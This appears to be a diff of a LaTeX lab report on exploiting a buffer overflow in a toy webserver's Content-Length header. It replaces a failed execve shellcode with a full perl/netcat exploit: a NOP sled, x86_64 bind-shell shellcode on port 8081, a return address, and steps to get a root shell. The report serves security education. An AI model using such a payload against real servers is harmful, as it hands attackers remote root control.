@@ -116,22 +116,58 @@ In the second shell, we can exploit the vulnerability as easily as sending an ar
   \caption{Exploiting the vulnerability with a 10000-byte-sized payload: the server crashes with a \textit{segmentation fault} error.}
 \end{figure}
 
+\newpage
+
 \section{Shellcode}
 
-It is additionally possible to exploit the vulnerability via injecting shell code in the Content-Length parameter (the path parameter is also vulnerable, although harder to exploit). In order to obtain the necessary parameters for a successful exploitation, I used \verb=gdb= on the \verb=webserver= executable, placing a breakpoint at line \verb=88= in order to learn the address of the \verb=rip= (return instruction pointer) address. For the shell code, I used the following one: \url{http://shell-storm.org/shellcode/files/shellcode-106.php}. The obtained script looked like this:
+It is additionally possible to exploit the vulnerability via injecting shell code in the Content-Length parameter (the path parameter is also vulnerable, although harder to exploit). In order to obtain the necessary parameters for a successful exploitation, I used \verb=gdb= on the \verb=webserver= executable, placing a breakpoint at line \verb=88= in order to learn the address of the \verb=rip= (return instruction pointer) address and gather information about the required number of NOPs. 
+
+\begin{figure}[h!]
+  \centering
+  \includegraphics[width=0.9\textwidth]{drawable/info-frame.png}
+  \caption{Gathering information with \texttt{gdb}.}
+\end{figure}
+
+
+For the shellcode, I used the Python library \verb=pwntools= to generate a proper \verb=x86_64= Linux shellcode that binds a Dash shell to port \verb=8081=. The obtained script looked like this:
 
 \begin{code}{Code for the exploitation.}
-  perl -e 'print "POST \/ HTTP\/1.1\r\n
-  Content-Length: \x48\x31\xc0\x99\xb0\x3b\x48\xbf
-  \x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08
-  \x57\x48\x89\xe7\x57\x52\x48\x89\xe6\x0f\x05"
-   . "A"x1097
-   . "\xd0\xf9\x5a\xf7\xff\x7f"
-   . "\r\n\r\n"' | nc -v -v -q 2 localhost 8080
+  perl -e 'print "POST \/ HTTP\/1.1\r\nContent-Length: " . "\x90"x500
+   . "\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\xba\x01\x01\x01
+  \x01\x81\xf2\x03\x01\x1e\x90\x52\x6a\x10\x5a\x48\x89\xc5\x48\x89\xc7
+  \x6a\x31\x58\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x89\xef\x6a\x01\x5e
+  \x0f\x05\x6a\x2b\x58\x48\x89\xef\x31\xf6\x99\x0f\x05\x48\x89\xc5\x6a
+  \x03\x5e\x48\xff\xce\x78\x0b\x56\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb
+  \xef\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7
+  \x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08
+  \x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05" 
+  . "\x90"x494 . "\x90\xfb\x5a\xf7\xff\x7f" . "\r\n\r\n"'
+   | nc -v -v -q 2 localhost 8082
 \end{code}
 
-This code makes a request whose Content-Length header first contains the shell code, then some random As - enough to overflow the buffer and barely touch the \verb=rip= registry - finally, the address of the start of the buffer and two \verb=CRLF=. However, I wasn't able to fully reproduce the vulnerability, due to repeated segmentation fault.
+\begin{figure}[h!]
+  \centering
+  \includegraphics[width=0.5\textwidth]{drawable/buffer-start-nop.png}
+  \includegraphics[width=0.5\textwidth]{drawable/buffer-mid-nop.png}
+  \includegraphics[width=0.5\textwidth]{drawable/buffer-end-nop.png}
+  \caption{Inspecting the shellcode with GDB (start of payload, start of shellcode, end of payload)}
+\end{figure}
 
+This code makes a request whose Content-Length header first contains some NOP padding, then the shell code, then some more padding - enough to overflow the buffer and barely touch the \verb=rip= registry - finally, the address of the start of the buffer and two \verb=CRLF=.
+
+After making the request, the now-compromised webserver will spawn a \verb=/bin/dash/= and bind it to port \verb=8081=. We can, again, connect to it with netcat. Once in, we can use \verb=/bin/bash -i= to spawn an interactive shell as root (since the webserver was run as root) and we have full access to everything.
+
+\begin{figure}[h!]
+  \centering
+  \includegraphics[width=0.5\textwidth]{drawable/connecting-to-bindshell.png}
+  \caption{Connecting to our shell.}
+\end{figure}
+
+\begin{figure}[h!]
+  \centering
+  \includegraphics[width=0.5\textwidth]{drawable/executing-new-program.png}
+  \caption{What we see on the other side: a new program being executed within the webserver, with \texttt{exec}.}
+\end{figure}
 
 \endgroup
 \end{document}
